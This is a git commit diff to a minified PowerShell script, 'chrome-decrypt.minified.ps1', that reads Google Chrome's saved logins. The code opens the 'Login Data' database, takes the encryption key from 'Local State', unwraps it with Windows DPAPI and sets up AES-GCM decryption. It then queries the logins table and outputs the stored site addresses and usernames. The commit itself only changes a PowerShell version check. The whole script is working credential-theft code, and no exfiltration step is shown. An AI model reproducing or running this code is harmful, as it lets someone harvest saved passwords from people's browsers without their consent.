408a91672434b0719d7cf68d9e2bb71bc0d4be84
Robert <rwallhead@gmail.com>
2022-05-28 13:44:43 +1000

    1281

--- chrome-decrypt.minified.ps1
+++ chrome-decrypt.minified.ps1
@@ -9,7 +9,7 @@ $z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
 $u=[Security.Cryptography.ProtectedData]
 Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
 $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
-if($host.Version.Major -eq 7){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
+if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
 for(;!([W]::S($s)%100)){[W]::T($s,0)
 [W]::T($s,3)
